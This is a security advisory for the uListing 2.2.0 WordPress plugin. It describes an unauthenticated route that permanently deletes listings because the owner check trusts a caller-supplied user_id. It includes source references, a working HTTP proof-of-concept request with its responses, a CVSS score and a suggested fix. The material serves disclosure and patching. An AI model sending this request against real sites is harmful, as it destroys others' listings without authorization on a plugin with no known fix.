# ULISTING-2026-01: Unauthenticated permanent deletion of listings through `/1/api/ulisting-user/deletelisting`

- Product: uListing (https://wordpress.org/plugins/ulisting/); source published on the wordpress.org plugin SVN, no official GitHub repository known to me
- Affected: 2.2.0, the latest release on wordpress.org when checked on 2026-11-18
- CVSS 3.1: 7.5 (High) `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`
- Reporter: thientc (VinSOC)
- Vendor status: not reported to the vendor as of 2026-11-22
- CVE: requested from MITRE on 2026-11-22, pending

## Summary

`POST /1/api/ulisting-user/deletelisting` deletes a listing for anyone who sends the listing ID and the owner's user ID. The route has no login or capability check, only the `ulisting-ajax-nonce` that the plugin prints on front-end pages for logged-out visitors too. The ownership test compares the listing owner with the `user_id` from the request body. In my lab a request with no cookies force-deleted an administrator's published listing.

## Details

1. `includes/route.php:107-116` registers `ULISTING_BASE_URL . '/ulisting-user/deletelisting'` (`/1/api/...`, see `uListing.php:19`) with only the `UlistingVerifyNonce` middleware, and calls `StmUser::delete_listing()`. The neighbouring `draft_or_delete` route (line 98) at least requires `is_user_logged_in()`; this one doesn't.
2. The middleware (`includes/classes/vendor/wp-router/middleware/class-wp-verify-nonce.php:11-24`) only runs `wp_verify_nonce( $nonce, 'ulisting-ajax-nonce' )`.
3. `includes/enqueue.php:39` prints `var ulistingAjaxNonce = '...'` as an inline script on `wp_enqueue_scripts`, so a logged-out visitor gets a valid user-0 nonce.
4. `StmUser::delete_listing()` (`includes/classes/StmUser.php:515`) takes `user_id` and `listing_id` from the JSON body, loads the listing's owner from the plugin's listing/user relation table, and then:

```php
if ( $listingUserRelation->user_id == $request_data['user_id'] ) {
    wp_delete_post( $listing_id, 'false' );
```

(`StmUser.php:559-560`). Both sides of the comparison come from the caller, so nothing ties the request to a logged-in user. `'false'` is a non-empty string and therefore truthy, so `wp_delete_post()` skips the trash and deletes the post for good.

Preconditions: the attacker needs the listing ID and the owner's user ID. A wrong owner ID returns `{"success":false}` and changes nothing.

## PoC

Setup: WordPress 7.1.4 with uListing 2.2.0 active, default settings. A published listing (post ID 6) owned by the administrator (user 1); I created the owner link with the plugin's own `StmListing::setUser()`, which is what sets the relation row the check reads.

1. Without logging in, load the home page and copy `ulistingAjaxNonce` from the inline script.
2. With no cookies:

```http
POST /1/api/ulisting-user/deletelisting HTTP/1.1
Host: <host>
Content-Type: application/json

{"nonce":"<ulistingAjaxNonce>","user_id":1,"listing_id":6}
```

```
HTTP/1.1 200
{"success":true,"data":[]}
```

3. Before the request the listing was `publish` with one relation row. Afterwards `wp post exists 6` returned nothing and `SELECT COUNT(*) FROM wp_posts WHERE ID=6` returned 0, so the post was deleted outright and is not in the trash.

Controls, run before step 2: a wrong nonce returned an empty 200 response and the listing stayed published; the correct nonce with `"user_id":999999` returned `{"success":false,"data":[]}` and the listing stayed published.

## Impact

Without an account, an attacker who knows a listing ID and its owner's user ID can permanently delete that listing. In the lab this removed an administrator's published listing with no trash copy. One request per listing; no data comes back.

I did not test the `ulisting_back_slots` option. From the code, with it on `delete_listing()` also changes the owner's plan slot counter before the owner check (`StmUser.php:546-556`).

## Suggested fix

Require a logged-in user and compare the owner with `get_current_user_id()` rather than the request's `user_id`, or check `current_user_can( 'delete_post', $listing_id )`. Pass a real boolean to `wp_delete_post()`. `draft_or_delete_listing()` (`StmUser.php:497`) uses the same request-`user_id` comparison and should get the same fix. I did not test a patch.

## Affected versions

- Tested and affected: 2.2.0 (wordpress.org archive, SHA-256 bc703f88038eb94ef3c9d4cf68977a107f7473a2ccff301749ac6342717e78cd).
- Earlier versions were not checked.
- Fixed in: no fixed release known.

Related: a separate logged-in issue in the `draft_or_delete` route (the same `user_id` comparison, listing status change only) was submitted to WPScan on 2026-10-30. This deletion issue has not been reported anywhere.

Tested on a local WordPress lab with test accounts and synthetic data only; no live site was tested.

## Severity

CVSS 3.1 base score **7.5** (High): `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`

- **AV:N** Public REST-style route over HTTP.
- **AC:L** The nonce is on any front-end page; the owner ID has to be known or guessed, and a wrong guess has no effect.
- **PR:N** Sent with no login cookie.
- **UI:N** No victim action.
- **S:U** Stays within the site.
- **C:N** Nothing returned.
- **I:H** Permanent deletion of a listing the attacker doesn't own, with no trash copy. Scored per listing instead, I:L gives 5.3.
- **A:N** The site stays up.

## Credit

thientc (VinSOC)
